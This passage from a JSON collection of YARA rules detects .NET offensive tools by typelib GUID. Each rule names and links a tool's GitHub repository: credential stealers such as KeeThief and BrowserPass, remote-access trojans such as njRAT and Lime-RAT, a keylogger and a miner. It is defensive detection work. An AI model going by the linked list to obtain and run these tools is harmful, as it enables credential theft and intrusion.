  "HKTL_NET_GUID_Net_GPPPassword": "rule HKTL_NET_GUID_Net_GPPPassword {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/outflanknl/Net-GPPPassword\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"00fcf72c-d148-4dd0-9ca4-0181c4bd55c3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_FileSearcher": "rule HKTL_NET_GUID_FileSearcher {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NVISO-BE/FileSearcher\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2c879479-5027-4ce9-aaac-084db0e6d630\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ADFSDump": "rule HKTL_NET_GUID_ADFSDump {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/fireeye/ADFSDump\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"9ee27d63-6ac9-4037-860b-44e91bae7f0d\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpRDP": "rule HKTL_NET_GUID_SharpRDP {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/0xthirteen/SharpRDP\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"f1df1d0f-ff86-4106-97a8-f95aaf525c54\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpCall": "rule HKTL_NET_GUID_SharpCall {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jhalon/SharpCall\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"c1b0a923-0f17-4bc8-ba0f-c87aff43e799\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ysoserial_net": "rule HKTL_NET_GUID_ysoserial_net {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/pwntester/ysoserial.net\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e1e8c029-f7cd-4bd1-952e-e819b41520f0\" ascii nocase wide\n        $typelibguid1 = \"6b40fde7-14ea-4f57-8b7b-cc2eb4a25e6c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ManagedInjection": "rule HKTL_NET_GUID_ManagedInjection {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malcomvetter/ManagedInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"e5182bff-9562-40ff-b864-5a6b30c3b13b\" ascii nocase wide\n        $typelibguid1 = \"fdedde0d-e095-41c9-93fb-c2219ada55b1\" ascii nocase wide\n        $typelibguid2 = \"0dd00561-affc-4066-8c48-ce950788c3c8\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpSocks": "rule HKTL_NET_GUID_SharpSocks {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/nettitude/SharpSocks\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"2f43992e-5703-4420-ad0b-17cb7d89c956\" ascii nocase wide\n        $typelibguid1 = \"86d10a34-c374-4de4-8e12-490e5e65ddff\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Sharp_WMIExec": "rule HKTL_NET_GUID_Sharp_WMIExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/checkymander/Sharp-WMIExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"0a63b0a1-7d1a-4b84-81c3-bbbfe9913029\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_KeeThief": "rule HKTL_NET_GUID_KeeThief {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/KeeThief\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid1 = \"39aa6f93-a1c9-497f-bad2-cc42a61d5710\" ascii nocase wide\n        $typelibguid3 = \"3fca8012-3bad-41e4-91f4-534aa9a44f96\" ascii nocase wide\n        $typelibguid4 = \"ea92f1e6-3f34-48f8-8b0a-f2bbc19220ef\" ascii nocase wide\n        $typelibguid5 = \"c23b51c4-2475-4fc6-9b3a-27d0a2b99b0f\" ascii nocase wide\n        $typelibguid6 = \"94432a8e-3e06-4776-b9b2-3684a62bb96a\" ascii nocase wide\n        $typelibguid7 = \"80ba63a4-7d41-40e9-a722-6dd58b28bf7e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_fakelogonscreen": "rule HKTL_NET_GUID_fakelogonscreen {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/bitsadmin/fakelogonscreen\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"d35a55bd-3189-498b-b72f-dc798172e505\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_PoshSecFramework": "rule HKTL_NET_GUID_PoshSecFramework {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/PoshSec/PoshSecFramework\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"b1ac6aa0-2f1a-4696-bf4b-0e41cf2f4b6b\" ascii nocase wide\n        $typelibguid1 = \"78bfcfc2-ef1c-4514-bce6-934b251666d2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpAttack": "rule HKTL_NET_GUID_SharpAttack {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jaredhaight/SharpAttack\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"5f0ceca3-5997-406c-adf5-6c7fbb6cba17\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Altman": "rule HKTL_NET_GUID_Altman {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/keepwn/Altman\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"64cdcd2b-7356-4079-af78-e22210e66154\" ascii nocase wide\n        $typelibguid1 = \"f1dee29d-ca98-46ea-9d13-93ae1fda96e1\" ascii nocase wide\n        $typelibguid2 = \"33568320-56e8-4abb-83f8-548e8d6adac2\" ascii nocase wide\n        $typelibguid3 = \"470ec930-70a3-4d71-b4ff-860fcb900e85\" ascii nocase wide\n        $typelibguid4 = \"9514574d-6819-44f2-affa-6158ac1143b3\" ascii nocase wide\n        $typelibguid5 = \"0f3a9c4f-0b11-4373-a0a6-3a6de814e891\" ascii nocase wide\n        $typelibguid6 = \"9624b72e-9702-4d78-995b-164254328151\" ascii nocase wide\n        $typelibguid7 = \"faae59a8-55fc-48b1-a9b5-b1759c9c1010\" ascii nocase wide\n        $typelibguid8 = \"37af4988-f6f2-4f0c-aa2b-5b24f7ed3bf3\" ascii nocase wide\n        $typelibguid9 = \"c82aa2fe-3332-441f-965e-6b653e088abf\" ascii nocase wide\n        $typelibguid10 = \"6e531f6c-2c89-447f-8464-aaa96dbcdfff\" ascii nocase wide\n        $typelibguid11 = \"231987a1-ea32-4087-8963-2322338f16f6\" ascii nocase wide\n        $typelibguid12 = \"7da0d93a-a0ae-41a5-9389-42eff85bb064\" ascii nocase wide\n        $typelibguid13 = \"a729f9cc-edc2-4785-9a7d-7b81bb12484c\" ascii nocase wide\n        $typelibguid14 = \"55a1fd43-d23e-4d72-aadb-bbd1340a6913\" ascii nocase wide\n        $typelibguid15 = \"d43f240d-e7f5-43c5-9b51-d156dc7ea221\" ascii nocase wide\n        $typelibguid16 = \"c2e6c1a0-93b1-4bbc-98e6-8e2b3145db8e\" ascii nocase wide\n        $typelibguid17 = \"714ae6f3-0d03-4023-b753-fed6a31d95c7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_BrowserPass": "rule HKTL_NET_GUID_BrowserPass {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jabiel/BrowserPass\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-28\"\n    strings:\n        $typelibguid0 = \"3cb59871-0dce-453b-857a-2d1e515b0b66\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Mythic": "rule HKTL_NET_GUID_Mythic {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/its-a-feature/Mythic\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"91f7a9da-f045-4239-a1e9-487ffdd65986\" ascii nocase wide\n        $typelibguid1 = \"0405205c-c2a0-4f9a-a221-48b5c70df3b6\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Nuages": "rule HKTL_NET_GUID_Nuages {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/p3nt4/Nuages\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"e9e80ac7-4c13-45bd-9bde-ca89aadf1294\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpSniper": "rule HKTL_NET_GUID_SharpSniper {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/HunnicCyber/SharpSniper\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"c8bb840c-04ce-4b60-a734-faf15abf7b18\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpHound3": "rule HKTL_NET_GUID_SharpHound3 {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BloodHoundAD/SharpHound3\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"a517a8de-5834-411d-abda-2d0e1766539c\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_BlockEtw": "rule HKTL_NET_GUID_BlockEtw {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Soledge/BlockEtw\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"daedf7b3-8262-4892-adc4-425dd5f85bca\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpWifiGrabber": "rule HKTL_NET_GUID_SharpWifiGrabber {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/r3nhat/SharpWifiGrabber\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"c0997698-2b73-4982-b25b-d0578d1323c2\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpMapExec": "rule HKTL_NET_GUID_SharpMapExec {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/cube0x0/SharpMapExec\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"bd5220f7-e1fb-41d2-91ec-e4c50c6e9b9f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_k8fly": "rule HKTL_NET_GUID_k8fly {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/zzwlpx/k8fly\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"13b6c843-f3d4-4585-b4f3-e2672a47931e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Stealer": "rule HKTL_NET_GUID_Stealer {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/malwares/Stealer\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"8fcd4931-91a2-4e18-849b-70de34ab75df\" ascii nocase wide\n        $typelibguid1 = \"e48811ca-8af8-4e73-85dd-2045b9cca73a\" ascii nocase wide\n        $typelibguid2 = \"d3d8a1cc-e123-4905-b3de-374749122fcf\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_PortTran": "rule HKTL_NET_GUID_PortTran {\n    meta:\n        description = \"Detects c# red/black-team tools via typelibguid\"\n        reference = \"https://github.com/k8gege/PortTran\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-29\"\n    strings:\n        $typelibguid0 = \"3a074374-77e8-4312-8746-37f3cb00e82c\" ascii nocase wide\n        $typelibguid1 = \"67a73bac-f59d-4227-9220-e20a2ef42782\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_gray_keylogger_2": "rule HKTL_NET_GUID_gray_keylogger_2 {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/graysuit/gray-keylogger-2\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"e94ca3ff-c0e5-4d1a-ad5e-f6ebbe365067\" ascii nocase wide\n        $typelibguid1 = \"1ed07564-b411-4626-88e5-e1cd8ecd860a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Lime_Miner": "rule HKTL_NET_GUID_Lime_Miner {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-Miner\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"13958fb9-dfc1-4e2c-8a8d-a5e68abdbc66\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_BlackNET": "rule HKTL_NET_GUID_BlackNET {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/BlackHacker511/BlackNET\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"c2b90883-abee-4cfa-af66-dfd93ec617a5\" ascii nocase wide\n        $typelibguid1 = \"8bb6f5b4-e7c7-4554-afd1-48f368774837\" ascii nocase wide\n        $typelibguid2 = \"983ae28c-91c3-4072-8cdf-698b2ff7a967\" ascii nocase wide\n        $typelibguid3 = \"9ac18cdc-3711-4719-9cfb-5b5f2d51fd5a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_PlasmaRAT": "rule HKTL_NET_GUID_PlasmaRAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/PlasmaRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"b8a2147c-074c-46e1-bb99-c8431a6546ce\" ascii nocase wide\n        $typelibguid1 = \"0fcfde33-213f-4fb6-ac15-efb20393d4f3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Lime_RAT": "rule HKTL_NET_GUID_Lime_RAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/NYAN-x-CAT/Lime-RAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"e58ac447-ab07-402a-9c96-95e284a76a8d\" ascii nocase wide\n        $typelibguid1 = \"8fb35dab-73cd-4163-8868-c4dbcbdf0c17\" ascii nocase wide\n        $typelibguid2 = \"37845f5b-35fe-4dce-bbec-2d07c7904fb0\" ascii nocase wide\n        $typelibguid3 = \"83c453cf-0d29-4690-b9dc-567f20e63894\" ascii nocase wide\n        $typelibguid4 = \"8b1f0a69-a930-42e3-9c13-7de0d04a4add\" ascii nocase wide\n        $typelibguid5 = \"eaaeccf6-75d2-4616-b045-36eea09c8b28\" ascii nocase wide\n        $typelibguid6 = \"5b2ec674-0aa4-4209-94df-b6c995ad59c4\" ascii nocase wide\n        $typelibguid7 = \"e2cc7158-aee6-4463-95bf-fb5295e9e37a\" ascii nocase wide\n        $typelibguid8 = \"d04ecf62-6da9-4308-804a-e789baa5cc38\" ascii nocase wide\n        $typelibguid9 = \"8026261f-ac68-4ccf-97b2-3b55b7d6684d\" ascii nocase wide\n        $typelibguid10 = \"212cdfac-51f1-4045-a5c0-6e638f89fce0\" ascii nocase wide\n        $typelibguid11 = \"c1b608bb-7aed-488d-aa3b-0c96625d26c0\" ascii nocase wide\n        $typelibguid12 = \"4c84e7ec-f197-4321-8862-d5d18783e2fe\" ascii nocase wide\n        $typelibguid13 = \"3fc17adb-67d4-4a8d-8770-ecfd815f73ee\" ascii nocase wide\n        $typelibguid14 = \"f1ab854b-6282-4bdf-8b8b-f2911a008948\" ascii nocase wide\n        $typelibguid15 = \"aef6547e-3822-4f96-9708-bcf008129b2b\" ascii nocase wide\n        $typelibguid16 = \"a336f517-bca9-465f-8ff8-2756cfd0cad9\" ascii nocase wide\n        $typelibguid17 = \"5de018bd-941d-4a5d-bed5-fbdd111aba76\" ascii nocase wide\n        $typelibguid18 = \"bbfac1f9-cd4f-4c44-af94-1130168494d0\" ascii nocase wide\n        $typelibguid19 = \"1c79cea1-ebf3-494c-90a8-51691df41b86\" ascii nocase wide\n        $typelibguid20 = \"927104e1-aa17-4167-817c-7673fe26d46e\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_njRAT": "rule HKTL_NET_GUID_njRAT {\n    meta:\n        description = \"Detects VB.NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mwsrc/njRAT\"\n        author = \"Arnim Rupp\"\n        date = \"2020-12-30\"\n    strings:\n        $typelibguid0 = \"5a542c1b-2d36-4c31-b039-26a88d3967da\" ascii nocase wide\n        $typelibguid1 = \"6b07082a-9256-42c3-999a-665e9de49f33\" ascii nocase wide\n        $typelibguid2 = \"c0a9a70f-63e8-42ca-965d-73a1bc903e62\" ascii nocase wide\n        $typelibguid3 = \"70bd11de-7da1-4a89-b459-8daacc930c20\" ascii nocase wide\n        $typelibguid4 = \"fc790ee5-163a-40f9-a1e2-9863c290ff8b\" ascii nocase wide\n        $typelibguid5 = \"cb3c28b2-2a4f-4114-941c-ce929fec94d3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_Manager": "rule HKTL_NET_GUID_Manager {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/Manager\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"dda73ee9-0f41-4c09-9cad-8215abd60b33\" ascii nocase wide\n        $typelibguid1 = \"6a0f2422-d4d1-4b7e-84ad-56dc0fd2dfc5\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_neo_ConfuserEx": "rule HKTL_NET_GUID_neo_ConfuserEx {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/XenocodeRCE/neo-ConfuserEx\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"e98490bb-63e5-492d-b14e-304de928f81a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpAllowedToAct": "rule HKTL_NET_GUID_SharpAllowedToAct {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/pkb1s/SharpAllowedToAct\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"dac5448a-4ad1-490a-846a-18e4e3e0cf9a\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SuperSQLInjectionV1": "rule HKTL_NET_GUID_SuperSQLInjectionV1 {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shack2/SuperSQLInjectionV1\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"d5688068-fc89-467d-913f-037a785caca7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_ADSearch": "rule HKTL_NET_GUID_ADSearch {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/tomcarver16/ADSearch\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"4da5f1b7-8936-4413-91f7-57d6e072b4a7\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_privilege_escalation_awesome_scripts_suite": "rule HKTL_NET_GUID_privilege_escalation_awesome_scripts_suite {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"1928358e-a64b-493f-a741-ae8e3d029374\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_CVE_2020_1206_POC": "rule HKTL_NET_GUID_CVE_2020_1206_POC {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/ZecOps/CVE-2020-1206-POC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"3523ca04-a12d-4b40-8837-1a1d28ef96de\" ascii nocase wide\n        $typelibguid1 = \"d3a2f24a-ddc6-4548-9b3d-470e70dbcaab\" ascii nocase wide\n        $typelibguid2 = \"fb30ee05-4a35-45f7-9a0a-829aec7e47d9\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_DInvoke": "rule HKTL_NET_GUID_DInvoke {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TheWover/DInvoke\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"b77fdab5-207c-4cdb-b1aa-348505c54229\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpChisel": "rule HKTL_NET_GUID_SharpChisel {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/shantanu561993/SharpChisel\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"f5f21e2d-eb7e-4146-a7e1-371fd08d6762\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpScribbles": "rule HKTL_NET_GUID_SharpScribbles {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/V1V1/SharpScribbles\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"aa61a166-31ef-429d-a971-ca654cd18c3b\" ascii nocase wide\n        $typelibguid1 = \"0dc1b824-c6e7-4881-8788-35aecb34d227\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpReg": "rule HKTL_NET_GUID_SharpReg {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpReg\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"8ef25b00-ed6a-4464-bdec-17281a4aa52f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_MemeVM": "rule HKTL_NET_GUID_MemeVM {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/TobitoFatitoRE/MemeVM\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"ef18f7f2-1f03-481c-98f9-4a18a2f12c11\" ascii nocase wide\n        $typelibguid1 = \"77b2c83b-ca34-4738-9384-c52f0121647c\" ascii nocase wide\n        $typelibguid2 = \"14d5d12e-9a32-4516-904e-df3393626317\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_SharpDir": "rule HKTL_NET_GUID_SharpDir {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jnqpblc/SharpDir\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"c7a07532-12a3-4f6a-a342-161bb060b789\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_AtYourService": "rule HKTL_NET_GUID_AtYourService {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/mitchmoser/AtYourService\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"bc72386f-8b4c-44de-99b7-b06a8de3ce3f\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
  "HKTL_NET_GUID_LockLess": "rule HKTL_NET_GUID_LockLess {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/GhostPack/LockLess\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"a91421cb-7909-4383-ba43-c2992bbbac22\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}",
